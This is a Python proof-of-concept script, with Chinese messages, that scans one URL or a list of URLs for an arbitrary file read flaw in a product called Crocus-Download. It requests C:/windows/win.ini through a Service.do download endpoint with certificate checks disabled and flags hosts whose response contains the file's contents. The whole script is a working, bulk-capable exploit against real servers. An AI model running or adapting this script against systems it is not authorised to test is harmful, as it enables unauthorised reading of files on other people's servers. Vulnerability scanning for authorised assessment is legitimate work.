#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
import argparse
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略证书验证警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_file_read(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15'
    }

    file_read_url = f"{url.rstrip('/')}/Service.do?Action=Download&Path=C:/windows/win.ini"
    
    try:
        response = requests.get(file_read_url, headers=headers, verify=False, timeout=30)
        if response.status_code == 200 and "fonts" in response.text:
            print(f"{RED}URL [{url}] 存在 Crocus-Download 任意文件读取漏洞{RESET}")
        else:
            print(f"URL [{url}] 可能不存在漏洞")
    except requests.RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在 Crocus-Download 任意文件读取漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_file_read(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_file_read(url)

if __name__ == '__main__':
    main()
